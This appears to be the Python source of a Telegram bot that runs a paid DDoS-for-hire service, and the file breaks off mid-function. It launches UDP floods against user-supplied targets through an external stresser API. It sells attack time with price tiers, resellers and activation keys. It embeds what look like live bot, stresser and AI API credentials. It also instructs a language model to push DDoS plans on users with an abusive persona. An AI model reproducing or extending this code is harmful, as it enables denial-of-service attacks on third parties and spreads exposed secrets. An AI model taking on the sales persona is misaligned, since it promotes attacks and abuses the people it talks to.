import telebot
import subprocess
import datetime
import os
import time
import threading
import json
import random
import string
import re
import requests
import psutil
import platform
from collections import defaultdict
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from openai import OpenAI

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8968154015:AAFmb_1HhLbOroeVaCXS27xPFp9nGTRP5GA"
OWNER_ID = "7944283616"
CO_OWNERS_FILE = "co_owners.json"

# API Configuration
API_URL = "https://retrostress.net/api/start"
API_KEY = "7067305bdb2e8a802902e9c461bb8ecc6b8036c87259f3d5da44f89549930dd4"
API_METHOD = "UDP-BIG"

# AI Configuration
ai_client = OpenAI(
    base_url="https://integrate.api.nvidia.com/v1",
    api_key="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"
)

# Files
USER_FILE = "users.json"
KEYS_FILE = "keys.json"
ATTACKS_FILE = "attacks.json"
LOG_FILE = "logs.txt"
RESELLER_FILE = "resellers.json"
BALANCE_FILE = "balances.json"
APPROVED_GROUPS_FILE = "approved_groups.json"
BANNED_FILE = "banned_users.json"
QR_FILE = "qr_code.json"

# DDoS Pricing (for /price command)
DDOS_PRICING = {
    "12h": {"name": "12 HOUR", "price": "₹50", "duration": 12, "unit": "hour"},
    "1d": {"name": "1 DAY", "price": "₹90", "duration": 1, "unit": "day"},
    "2d": {"name": "2 DAYS", "price": "₹150", "duration": 2, "unit": "day"},
    "3d": {"name": "3 DAYS", "price": "₹200", "duration": 3, "unit": "day"},
    "7d": {"name": "7 DAYS", "price": "₹300", "duration": 7, "unit": "day"}
}

# Default Settings for Private Chat
MAX_CONCURRENT_ATTACKS = 5
MAX_ATTACK_DURATION = 300
COOLDOWN_SECONDS = 120

# Group Settings (Free Mode)
GROUP_MAX_CONCURRENT = 1
GROUP_MAX_DURATION = 300
GROUP_COOLDOWN_SECONDS = 500

# Store group-specific settings
group_custom_settings = {}

# Reseller key pricing
RESELLER_KEY_PRICING = {
    "12h": {"credits": 50, "duration": 12, "unit": "hour", "name": "12 Hours"},
    "1d": {"credits": 100, "duration": 1, "unit": "day", "name": "1 Day"},
    "2d": {"credits": 200, "duration": 2, "unit": "day", "name": "2 Days"},
    "3d": {"credits": 300, "duration": 3, "unit": "day", "name": "3 Days"},
    "7d": {"credits": 700, "duration": 7, "unit": "day", "name": "7 Days"},
    "30d": {"credits": 3000, "duration": 30, "unit": "day", "name": "30 Days"}
}

# Store active attacks and cooldowns
active_attacks = {}
group_active_attacks = defaultdict(dict)
user_cooldowns = {}
group_user_cooldowns = defaultdict(dict)
attack_message_ids = {}
group_attack_message_ids = defaultdict(dict)

# Thread pool control
active_threads = []
attack_queue = []
queue_lock = threading.Lock()

# Bot start time
bot_start_time = time.time()

# ==================== AI FUNCTION ====================
def get_ai_response(user_id, user_message, username):
    is_owner = str(user_id) == OWNER_ID
    is_co = is_co_owner(user_id)
    
    system_prompt = """Tu ek Telegram bot hai. Tera name "ddos owner" hai. Tu khud owner hai or seller bhi hai.
    
    Teri personality:
    - Owner (7944283616) ke sath jigri dost ki tarah baat kar, pyaar se "Boss" bolke
    - Co-owners ke sath friendly
    - Normal users ke sath professional seller ki tarah baat, thoda toxic, "bhai" bolke
    - HAMESHA hinglish me reply (English alphabet me Hindi)
    - Gali dene pe: "teri ma ka bhosda chup salaa kutte ka pilla"
    - Sabko DDOS plan buy karne ke liye convince kar kese bhe bolke usse bol ki wo apne pass se hi buy kre 
    - Payment issue: "QR se payment kar, dusra QR bhi hai"
    - Setup: "Android hai ya iPhone?"
    - Agar koi plan/price puche to /price command use karne ko bol jb bhe ddos price ki naad aaye usse user ko puch kitne din ka baad me bolde cammnd use krle jo hai price dekhne dala ok 
    
    DDOS Plans:
    12 HOUR = ₹50
    1 DAY = ₹90
    2 DAYS = ₹150
    3 DAYS = ₹200
    7 DAYS = ₹300
    
    Payment: QR scan karo, screenshot bhejo, 2 min me key milega.
    Owner: @GOD_x_OFFICIAL"""
    
    if is_owner:
        system_prompt += "\n\nTERA OWNER HAI YE. Pyaar se baat kar, 'Boss' bol."
    elif is_co:
        system_prompt += "\n\nCo-Owner hai. Respect se baat kar."
    else:
        system_prompt += "\n\nNormal customer. Sell karne ki koshish kar."
    
    try:
        completion = ai_client.chat.completions.create(
            model="deepseek-ai/deepseek-v4-pro",
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_message}
            ],
            temperature=1,
            top_p=0.95,
            max_tokens=1024,
            extra_body={"chat_template_kwargs":{"thinking":False}},
            stream=False
        )
        return completion.choices[0].message.content
    except:
        if is_owner:
            return "Haa Boss bolo, sab set hai 😎"
        else:
            return "Haa bhai bolo, kaunsa plan chahiye? /price karo dekh lo 😎"

# ==================== QR CODE FUNCTIONS ====================
def load_qr():
    if os.path.exists(QR_FILE):
        with open(QR_FILE, 'r') as f:
            return json.load(f)
    return {"qr_file_id": None}

def save_qr(data):
    with open(QR_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ==================== API ATTACK FUNCTION ====================
def send_api_attack(target, port, duration):
    try:
        url = f"{API_URL}?key={API_KEY}&target={target}&port={port}&time={duration}&method={API_METHOD}"
        response = requests.get(url, timeout=5)
        return True, response.text
    except Exception as e:
        return False, str(e)

# ==================== CO-OWNER FUNCTIONS ====================
def load_co_owners():
    if os.path.exists(CO_OWNERS_FILE):
        with open(CO_OWNERS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_co_owners(co_owners):
    with open(CO_OWNERS_FILE, 'w') as f:
        json.dump(co_owners, f, indent=2)

def is_co_owner(user_id):
    co_owners = load_co_owners()
    return str(user_id) in co_owners

def add_co_owner(user_id):
    co_owners = load_co_owners()
    if str(user_id) not in co_owners:
        co_owners.append(str(user_id))
        save_co_owners(co_owners)
        try:
            bot.send_message(user_id, "╔══════════════════════════════╗\n║     👑 CO-OWNER ACCESS      ║\n╚══════════════════════════════╝\n\n✅ You now have full access to all commands.", parse_mode="Markdown")
        except:
            pass
        return True
    return False

def remove_co_owner(user_id):
    co_owners = load_co_owners()
    if str(user_id) in co_owners:
        co_owners.remove(str(user_id))
        save_co_owners(co_owners)
        try:
            bot.send_message(user_id, "╔══════════════════════════════╗\n║    ⚠️ ACCESS REVOKED        ║\n╚══════════════════════════════╝\n\nYour co-owner privileges have been removed.", parse_mode="Markdown")
        except:
            pass
        return True
    return False

def is_admin(user_id):
    return str(user_id) == OWNER_ID or is_co_owner(user_id)

# ==================== GROUP FUNCTIONS ====================
def load_approved_groups():
    if os.path.exists(APPROVED_GROUPS_FILE):
        with open(APPROVED_GROUPS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_approved_groups(groups):
    with open(APPROVED_GROUPS_FILE, 'w') as f:
        json.dump(groups, f, indent=2)

def is_group_approved(group_id):
    groups = load_approved_groups()
    return str(group_id) in groups

def get_group_settings(group_id):
    groups = load_approved_groups()
    group_data = groups.get(str(group_id), {})
    return {
        "max_concurrent": group_data.get("max_concurrent", GROUP_MAX_CONCURRENT),
        "max_duration": group_data.get("max_duration", GROUP_MAX_DURATION),
        "cooldown": group_data.get("cooldown", GROUP_COOLDOWN_SECONDS)
    }

def set_group_settings(group_id, max_concurrent=None, max_duration=None, cooldown=None):
    groups = load_approved_groups()
    group_id_str = str(group_id)
    
    if group_id_str not in groups:
        groups[group_id_str] = {"approved": True}
    
    if max_concurrent is not None:
        groups[group_id_str]["max_concurrent"] = max_concurrent
    if max_duration is not None:
        groups[group_id_str]["max_duration"] = max_duration
    if cooldown is not None:
        groups[group_id_str]["cooldown"] = cooldown
    
    save_approved_groups(groups)
    return get_group_settings(group_id)

def is_user_in_group_cooldown(group_id, user_id):
    group_id_str = str(group_id)
    user_id_str = str(user_id)
    
    if group_id_str in group_user_cooldowns:
        if user_id_str in group_user_cooldowns[group_id_str]:
            cooldown_end = group_user_cooldowns[group_id_str][user_id_str]
            if time.time() < cooldown_end:
                return int(cooldown_end - time.time())
    return 0

def set_user_group_cooldown(group_id, user_id, duration):
    group_id_str = str(group_id)
    user_id_str = str(user_id)
    
    if group_id_str not in group_user_cooldowns:
        group_user_cooldowns[group_id_str] = {}
    
    group_user_cooldowns[group_id_str][user_id_str] = time.time() + duration
    
    def cleanup():
        time.sleep(duration)
        if group_id_str in group_user_cooldowns and user_id_str in group_user_cooldowns[group_id_str]:
            del group_user_cooldowns[group_id_str][user_id_str]
    
    threading.Thread(target=cleanup, daemon=True).start()

def get_group_active_attack_count(group_id):
    group_id_str = str(group_id)
    return len(group_active_attacks.get(group_id_str, {}))

def add_group_attack(group_id, user_id, attack_info):
    group_id_str = str(group_id)
    user_id_str = str(user_id)
    
    if group_id_str not in group_active_attacks:
        group_active_attacks[group_id_str] = {}
    
    group_active_attacks[group_id_str][user_id_str] = attack_info

def remove_group_attack(group_id, user_id):
    group_id_str = str(group_id)
    user_id_str = str(user_id)
    
    if group_id_str in group_active_attacks:
        if user_id_str in group_active_attacks[group_id_str]:
            del group_active_attacks[group_id_str][user_id_str]

def can_attack_in_group(group_id, user_id, duration):
    settings = get_group_settings(group_id)
    
    if duration > settings["max_duration"]:
        return False, f"╔══════════════════════════════╗\n║   ❌ DURATION EXCEEDED      ║\n╚══════════════════════════════╝\n\nMax: {settings['max_duration']}s | Request: {duration}s"
    
    cooldown_remaining = is_user_in_group_cooldown(group_id, user_id)
    if cooldown_remaining > 0:
        return False, f"╔══════════════════════════════╗\n║     ⏳ COOLDOWN ACTIVE      ║\n╚══════════════════════════════╝\n\nWait {cooldown_remaining}s\nUse /status to monitor"
    
    current_attacks = get_group_active_attack_count(group_id)
    if current_attacks >= settings["max_concurrent"]:
        return False, f"╔══════════════════════════════╗\n║    ⚠️ SLOTS FULL           ║\n╚══════════════════════════════╝\n\n{settings['max_concurrent']}/{settings['max_concurrent']} slots used\nUse /status to monitor"
    
    if str(user_id) in group_active_attacks.get(str(group_id), {}):
        return False, f"╔══════════════════════════════╗\n║  ⚠️ ATTACK RUNNING         ║\n╚══════════════════════════════╝\n\nYou already have an active attack\nUse /status to monitor"
    
    return True, None

# ==================== FILE HANDLING ====================
def load_json(file, default):
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except:
        return default

def save_json(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=2)

def init_files():
    files = [USER_FILE, KEYS_FILE, ATTACKS_FILE, RESELLER_FILE, BALANCE_FILE, APPROVED_GROUPS_FILE, BANNED_FILE, CO_OWNERS_FILE, QR_FILE]
    defaults = [{}, {"used": {}, "unused": {}}, {}, {}, {}, {}, {}, [], {"qr_file_id": None}]
    for file, default in zip(files, defaults):
        if not os.path.exists(file):
            save_json(file, default)
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w') as f:
            f.write("")

init_files()

# ==================== RESELLER & BALANCE HELPERS ====================
def is_reseller(user_id):
    resellers = load_json(RESELLER_FILE, {})
    return str(user_id) in resellers

def get_balance(user_id):
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        return 999999999
    balances = load_json(BALANCE_FILE, {})
    return balances.get(str(user_id), 0)

def add_balance(user_id, amount):
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        return 999999999
    balances = load_json(BALANCE_FILE, {})
    user_id = str(user_id)
    balances[user_id] = balances.get(user_id, 0) + amount
    save_json(BALANCE_FILE, balances)
    
    try:
        bot.send_message(
            user_id,
            f"╔══════════════════════════════╗\n║    💰 BALANCE UPDATED       ║\n╚══════════════════════════════╝\n\n✅ +{amount} credits\n💎 Balance: {balances[user_id]} credits",
            parse_mode="Markdown"
        )
    except:
        pass
    
    return balances[user_id]

def deduct_balance(user_id, amount):
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        return True
    balances = load_json(BALANCE_FILE, {})
    user_id = str(user_id)
    current = balances.get(user_id, 0)
    if current >= amount:
        balances[user_id] = current - amount
        save_json(BALANCE_FILE, balances)
        return True
    return False

def add_reseller(user_id):
    resellers = load_json(RESELLER_FILE, {})
    resellers[str(user_id)] = {
        "added_on": datetime.datetime.now().isoformat(),
        "added_by": "admin"
    }
    save_json(RESELLER_FILE, resellers)
    balances = load_json(BALANCE_FILE, {})
    if str(user_id) not in balances:
        balances[str(user_id)] = 0
        save_json(BALANCE_FILE, balances)
    
    try:
        bot.send_message(
            user_id,
            f"╔══════════════════════════════╗\n║   ✅ RESELLER PROMOTION     ║\n╚══════════════════════════════╝\n\n💎 Balance: 0 credits\nUse /help for commands",
            parse_mode="Markdown"
        )
    except:
        pass
    
    return True

def remove_reseller(user_id):
    resellers = load_json(RESELLER_FILE, {})
    if str(user_id) in resellers:
        del resellers[str(user_id)]
        save_json(RESELLER_FILE, resellers)
        
        try:
            bot.send_message(user_id, "╔══════════════════════════════╗\n║  ⚠️ RESELLER REMOVED       ║\n╚══════════════════════════════╝\n\nYour reseller access revoked", parse_mode="Markdown")
        except:
            pass
        
        return True
    return False

def remove_reseller_balance(user_id):
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        return False, "Cannot remove owner/co-owner balance"
    
    balances = load_json(BALANCE_FILE, {})
    user_id_str = str(user_id)
    if user_id_str not in balances:
        return False, "User not found"
    
    balances[user_id_str] = 0
    save_json(BALANCE_FILE, balances)
    return True, "Balance set to 0"

# ==================== KEY HELPERS ====================
def generate_keys_admin(prefix, duration, unit, count, max_users=1):
    keys = []
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    for _ in range(count):
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        key = f"{prefix}-{random_part}"
        keys.append(key)
        
        keys_data["unused"][key] = {
            "duration": duration,
            "unit": unit,
            "generated": datetime.datetime.now().isoformat(),
            "generated_by": "admin",
            "used": False,
            "used_by": None,
            "max_users": max_users,
            "redeemed_count": 0,
            "redeemed_users": []
        }
    
    save_json(KEYS_FILE, keys_data)
    return keys

def generate_keys_reseller(user_id, duration_key, count):
    if duration_key not in RESELLER_KEY_PRICING:
        return None, "Invalid key type. Available: 12h, 1d, 2d, 3d, 7d, 30d"
    
    cost = RESELLER_KEY_PRICING[duration_key]["credits"] * count
    if not deduct_balance(user_id, cost):
        return None, f"╔══════════════════════════════╗\n║  ❌ INSUFFICIENT BALANCE    ║\n╚══════════════════════════════╝\n\nNeed: {cost} | Have: {get_balance(user_id)} credits"
    
    duration_val = RESELLER_KEY_PRICING[duration_key]["duration"]
    unit = RESELLER_KEY_PRICING[duration_key]["unit"]
    keys = []
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    for _ in range(count):
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        key = f"Rolaxx-{random_part}"
        keys.append(key)
        
        keys_data["unused"][key] = {
            "duration": duration_val,
            "unit": unit,
            "generated": datetime.datetime.now().isoformat(),
            "generated_by": user_id,
            "used": False,
            "used_by": None,
            "max_users": 1,
            "redeemed_count": 0,
            "redeemed_users": []
        }
    
    save_json(KEYS_FILE, keys_data)
    return keys, None

def increase_key_duration(key, add_duration, add_unit):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    if key in keys_data["unused"]:
        keys_data["unused"][key]["duration"] += add_duration
        save_json(KEYS_FILE, keys_data)
        return True, "unused"
    elif key in keys_data["used"]:
        keys_data["used"][key]["duration"] += add_duration
        save_json(KEYS_FILE, keys_data)
        return True, "used"
    return False, None

def decrease_key_duration(key, dec_duration, dec_unit):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    if key in keys_data["unused"]:
        keys_data["unused"][key]["duration"] = max(0, keys_data["unused"][key]["duration"] - dec_duration)
        save_json(KEYS_FILE, keys_data)
        return True, "unused"
    elif key in keys_data["used"]:
        keys_data["used"][key]["duration"] = max(0, keys_data["used"][key]["duration"] - dec_duration)
        save_json(KEYS_FILE, keys_data)
        return True, "used"
    return False, None

def increase_all_keys(duration, unit):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    count = 0
    for key in keys_data["used"]:
        keys_data["used"][key]["duration"] += duration
        count += 1
    for key in keys_data["unused"]:
        keys_data["unused"][key]["duration"] += duration
        count += 1
    save_json(KEYS_FILE, keys_data)
    return count

def decrease_all_keys(duration, unit):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    count = 0
    for key in keys_data["used"]:
        keys_data["used"][key]["duration"] = max(0, keys_data["used"][key]["duration"] - duration)
        count += 1
    for key in keys_data["unused"]:
        keys_data["unused"][key]["duration"] = max(0, keys_data["unused"][key]["duration"] - duration)
        count += 1
    save_json(KEYS_FILE, keys_data)
    return count

def redeem_key(user_id, key):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    if key in keys_data["used"]:
        key_info = keys_data["used"][key]
        max_users = key_info.get("max_users", 1)
        redeemed_count = key_info.get("redeemed_count", 0)
        
        if redeemed_count >= max_users:
            return "max_redeemed", None
        return "expired", None
    
    if key not in keys_data["unused"]:
        return "invalid", None
    
    key_info = keys_data["unused"][key]
    duration = key_info["duration"]
    unit = key_info["unit"]
    max_users = key_info.get("max_users", 1)
    
    users = load_json(USER_FILE, {})
    if str(user_id) in users:
        return "already_active", None
    
    now = datetime.datetime.now()
    
    if unit == "min":
        expiry = now + datetime.timedelta(minutes=duration)
    elif unit == "hour":
        expiry = now + datetime.timedelta(hours=duration)
    else:
        expiry = now + datetime.timedelta(days=duration)
    
    redeemed_count = key_info.get("redeemed_count", 0) + 1
    redeemed_users = key_info.get("redeemed_users", [])
    redeemed_users.append(str(user_id))
    
    if redeemed_count >= max_users:
        keys_data["used"][key] = {
            **key_info,
            "used_by": user_id,
            "used_at": now.isoformat(),
            "expiry": expiry.isoformat(),
            "redeemed_count": redeemed_count,
            "redeemed_users": redeemed_users
        }
        del keys_data["unused"][key]
    else:
        keys_data["unused"][key]["redeemed_count"] = redeemed_count
        keys_data["unused"][key]["redeemed_users"] = redeemed_users
    
    save_json(KEYS_FILE, keys_data)
    
    users = load_json(USER_FILE, {})
    users[str(user_id)] = {
        "expiry": expiry.isoformat(),
        "key": key,
        "banned": False
    }
    save_json(USER_FILE, users)
    
    return "success", expiry

def remove_user_key(user_id):
    users = load_json(USER_FILE, {})
    user_id_str = str(user_id)
    
    if user_id_str in users:
        key = users[user_id_str].get("key")
        if key:
            keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
            if key in keys_data["used"]:
                del keys_data["used"][key]
                save_json(KEYS_FILE, keys_data)
        del users[user_id_str]
        save_json(USER_FILE, users)
        return True
    return False

def is_user_allowed(user_id):
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        return True, None
    
    banned_users = load_json(BANNED_FILE, {})
    if str(user_id) in banned_users:
        return False, None
    
    users = load_json(USER_FILE, {})
    user = users.get(str(user_id))
    
    if not user:
        return False, None
    if user.get("banned", False):
        return False, None
    
    expiry = datetime.datetime.fromisoformat(user["expiry"])
    if datetime.datetime.now() > expiry:
        return False, None
    
    return True, expiry

def can_attack_private(user_id, duration):
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        return True, None
    
    allowed, _ = is_user_allowed(user_id)
    if not allowed:
        return False, "No active plan found. Use /redeem <key> to activate"
    
    if duration > MAX_ATTACK_DURATION:
        return False, f"Duration exceeds limit: {MAX_ATTACK_DURATION}s"
    
    if user_id in user_cooldowns:
        remaining = int(user_cooldowns[user_id] - time.time())
        if remaining > 0:
            return False, f"Cooldown active. Wait {format_time(remaining)}"
    
    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        return False, f"All slots full ({MAX_CONCURRENT_ATTACKS}/{MAX_CONCURRENT_ATTACKS})"
    
    if user_id in active_attacks:
        return False, "You have an active attack running"
    
    return True, None

def log_attack(user_id, target, port, duration, chat_type="private", group_id=None, username=None, api_status="success"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    location = f"Group {group_id}" if group_id else "Private"
    user_info = f"{user_id}"
    if username:
        user_info += f" (@{username})"
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {location} | User: {user_info} | Target: {target}:{port} | Duration: {duration}s | API: {api_status}\n")

# ==================== SYSTEM INFO ====================
def get_system_info():
    cpu_percent = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    process = psutil.Process()
    
    uptime_seconds = time.time() - bot_start_time
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    
    users = load_json(USER_FILE, {})
    resellers = load_json(RESELLER_FILE, {})
    groups = load_approved_groups()
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    active_users_count = 0
    for uid, info in users.items():
        if not info.get("banned", False):
            try:
                expiry = datetime.datetime.fromisoformat(info["expiry"])
                if datetime.datetime.now() <= expiry:
                    active_users_count += 1
            except:
                pass
    
    info = f"""🖥️ SERVER STATISTICS
╔══════════════════════════════╗
║     📊 SYSTEM MONITOR       ║
╚══════════════════════════════╝

━━━━━━━ SYSTEM ━━━━━━━
🖥️ Platform: {platform.system()} {platform.release()}
🐍 Python: {platform.python_version()}
⚡ CPU Usage: {cpu_percent}%
💾 RAM Usage: {memory.percent}% ({memory.used / (1024**3):.1f}GB / {memory.total / (1024**3):.1f}GB)
💿 Disk Usage: {disk.percent}% ({disk.used / (1024**3):.1f}GB / {disk.total / (1024**3):.1f}GB)

━━━━━━━ PROCESS ━━━━━━━
🧵 Process Memory: {process.memory_info().rss / (1024**2):.1f} MB
⚡ Process CPU: {process.cpu_percent()}%
🔄 Threads: {process.num_threads()}
🆙 Process Uptime: {hours}h {minutes}m

━━━━━━━ BOT ━━━━━━━
🔥 Active Attacks: {len(active_attacks)}/{MAX_CONCURRENT_ATTACKS}
👤 Total Users: {len(users)}
✅ Active Users: {active_users_count}
👥 Approved none: {len(groups)}
💰 Resellers: {len(resellers)}
🔑 Unused Keys: {len(keys_data['unused'])}
🔴 Active Keys: {len(keys_data['used'])}"""
    
    return info

# ==================== REAL-TIME PROGRESS UPDATER ====================
def generate_progress_bar(progress, length=15):
    filled = int(progress * length / 100)
    bar = "█" * filled + "▒" * (length - filled)
    return bar

def format_time(seconds):
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        m, s = divmod(seconds, 60)
        return f"{m}m {s}s"
    else:
        h, r = divmod(seconds, 3600)
        m, s = divmod(r, 60)
        return f"{h}h {m}m {s}s"

def update_attack_progress_continuous(chat_id, message_id, target, port, duration, user_id, start_time, username=None, is_group=False, group_id=None):
    last_progress = -1
    
    while True:
        elapsed = time.time() - start_time
        if elapsed >= duration:
            break
        
        remaining = max(0, duration - int(elapsed))
        progress = int((elapsed / duration) * 100)
        
        if progress != last_progress:
            last_progress = progress
            bar = generate_progress_bar(progress)
            
            msg_text = (
                f"╔══════════════════════════════╗\n"
                f"║    🚀 ATTACK LAUNCHED       ║\n"
                f"╚══════════════════════════════╝\n\n"
                f"🎯 Target : {target}\n"
                f"🔌 Port   : {port}\n"
                f"⏱️ Time   : {format_time(duration)}\n"
                f"⏳ Left   : {format_time(remaining)}\n"
            )
            
            if username and is_group:
                msg_text += f"👤 User: @{username}\n"
            
            msg_text += (
                f"🎮 Method : GAME FLOOD\n"
                f"📍 Place  : {'Group' if is_group else 'Private'}\n\n"
                f"║  {bar} {progress}%"
            )
            
            try:
                bot.edit_message_text(msg_text, chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
            except:
                pass
        
        time.sleep(2)
    
    total_time = format_time(duration)
    msg_text = (
        f"╔══════════════════════════════╗\n"
        f"║    ✅ ATTACK COMPLETED       ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"🎯 Target : {target}\n"
        f"🔌 Port   : {port}\n"
        f"⏱️ Time   : {total_time}\n"
    )
    
    if username and is_group:
        msg_text += f"👤 User: @{username}\n"
    
    msg_text += (
        f"🎮 Method : GAME FLOOD\n"
        f"📍 Place  : {'Group' if is_group else 'Private'}\n\n"
        f"║  ███████████████ 100%\n"
        f"╔══════════════════════════════╗\n"
        f"║  use 📊 /status to monitor   ║\n"
        f"╚══════════════════════════════╝"
    )
    
    try:
        bot.edit_message_text(msg_text, chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
    except:
        pass
    
    if is_group:
        remove_group_attack(group_id, user_id)
        cooldown_duration = get_group_settings(group_id)["cooldown"]
        set_user_group_cooldown(group_id, user_id, cooldown_duration)
    else:
        if user_id in active_attacks:
            del active_attacks[user_id]
        if str(user_id) != OWNER_ID and not is_co_owner(user_id):
            user_cooldowns[user_id] = time.time() + COOLDOWN_SECONDS

def update_status_continuous(chat_id, user_id, msg_id, is_group=False, group_id=None):
    while True:
        try:
            if is_group:
                attacks = group_active_attacks.get(str(group_id), {})
                cooldown_remaining = is_user_in_group_cooldown(group_id, user_id)
                settings = get_group_settings(group_id)
                max_attacks = settings["max_concurrent"]
            else:
                attacks = active_attacks
                cooldown_remaining = max(0, int(user_cooldowns.get(user_id, 0) - time.time())) if user_id in user_cooldowns else 0
                max_attacks = MAX_CONCURRENT_ATTACKS
            
            status_msg = (
                f"╔══════════════════════════════╗\n"
                f"║     ⚔️ ATTACK STATUS       ║\n"
                f"╚══════════════════════════════╝\n\n"
            )
            
            status_msg += f"📊 Slots: {len(attacks)}/{max_attacks} used\n"
            status_msg += f"🆓 Available: {max_attacks - len(attacks)} slots\n\n"
            
            if attacks:
                status_msg += "━━━ ACTIVE ATTACKS ━━━\n\n"
                for uid, attack in list(attacks.items())[:10]:
                    elapsed = int(time.time() - attack["start_time"])
                    remaining = max(0, attack["duration"] - elapsed)
                    progress = int((elapsed / attack["duration"]) * 100) if attack["duration"] > 0 else 0
                    bar = generate_progress_bar(progress)
                    
                    status_msg += (
                        f"🎯 {attack['target']}:{attack['port']}\n"
                        f"⏱️ {format_time(remaining)} left\n"
                        f"[{bar}] {progress}%\n\n"
                    )
            else:
                status_msg += "📭 No active attacks\n\n"
            
            status_msg += "━━━ YOUR STATUS ━━━\n"
            if cooldown_remaining > 0:
                status_msg += f"⏳ Cooldown: {format_time(cooldown_remaining)}\n"
            else:
                status_msg += f"✅ No cooldown active\n"
            
            try:
                bot.edit_message_text(status_msg, chat_id, msg_id, parse_mode="Markdown")
            except:
                pass
            
            if not attacks and cooldown_remaining == 0:
                break
            
            time.sleep(3)
        except:
            time.sleep(3)
            continue

# ==================== ATTACK FUNCTION ====================
def start_attack(chat_id, user_id, target, port, duration, username=None, is_group=False, group_id=None):
    if is_group:
        can_attack, error_msg = can_attack_in_group(group_id, user_id, duration)
        if not can_attack:
            msg = bot.send_message(chat_id, error_msg, parse_mode="Markdown")
            return
        
        add_group_attack(group_id, user_id, {
            "target": target,
            "port": port,
            "duration": duration,
            "start_time": time.time(),
            "chat_id": chat_id,
            "username": username
        })
        
        log_attack(user_id, target, port, duration, chat_type="group", group_id=group_id, username=username)
        
        launch_msg = bot.send_message(
            chat_id,
            f"╔══════════════════════════════╗\n"
            f"║    🚀 ATTACK LAUNCHED       ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"🎯 Target : {target}\n"
            f"🔌 Port   : {port}\n"
            f"⏱️ Time   : {format_time(duration)}\n"
            f"⏳ Left   : {format_time(duration)}\n"
            f"👤 User: @{username}\n"
            f"🎮 Method : GAME FLOOD\n"
            f"📍 Place  : Group\n\n"
            f"║  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 0%",
            parse_mode="Markdown"
        )
        
        def run_attack():
            try:
                send_api_attack(target, port, duration)
            except:
                pass
        
        threading.Thread(target=run_attack, daemon=True).start()
        
        threading.Thread(
            target=update_attack_progress_continuous,
            args=(chat_id, launch_msg.message_id, target, port, duration, user_id, time.time(), username, True, group_id),
            daemon=True
        ).start()
        
    else:
        can_attack, error_msg = can_attack_private(user_id, duration)
        if not can_attack:
            bot.send_message(chat_id, f"❌ {error_msg}", parse_mode="Markdown")
            return
        
        active_attacks[user_id] = {
            "target": target,
            "port": port,
            "duration": duration,
            "start_time": time.time(),
            "chat_id": chat_id
        }
        
        log_attack(user_id, target, port, duration, username=username)
        
        launch_msg = bot.send_message(
            chat_id,
            f"╔══════════════════════════════╗\n"
            f"║    🚀 ATTACK LAUNCHED       ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"🎯 Target : {target}\n"
            f"🔌 Port   : {port}\n"
            f"⏱️ Time   : {format_time(duration)}\n"
            f"⏳ Left   : {format_time(duration)}\n"
            f"🎮 Method : GAME FLOOD\n"
            f"📍 Place  : Private\n\n"
            f"║  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 0%",
            parse_mode="Markdown"
        )
        
        def run_attack():
            try:
                send_api_attack(target, port, duration)
            except:
                pass
        
        threading.Thread(target=run_attack, daemon=True).start()
        
        threading.Thread(
            target=update_attack_progress_continuous,
            args=(chat_id, launch_msg.message_id, target, port, duration, user_id, time.time(), username, False, None),
            daemon=True
        ).start()

# ==================== BOT INIT ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ==================== START COMMAND ====================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    
    welcome_msg = (
        f"╔══════════════════════════════╗\n"
        f"║  ✨ WELCOME TO DDoS BOT    ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"🆔 User ID: <code>{user_id}</code>\n\n"
    )
    
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        welcome_msg += "👑 Owner/Admin Access\n⚡ Unlimited attacks\n\n"
    elif is_user_allowed(user_id)[0]:
        welcome_msg += "✅ Active Plan\n\n"
    else:
        welcome_msg += "❌ No Active Plan\n\n"
    
    welcome_msg += (
        "Use /redeem &lt;key&gt; to access bot\n"
        "Use /help to see your commands"
    )
    
    bot.reply_to(message, welcome_msg, parse_mode="HTML")
    
    # AI welcome after 3 seconds
    def ai_welcome():
        time.sleep(3)
        if str(user_id) == OWNER_ID:
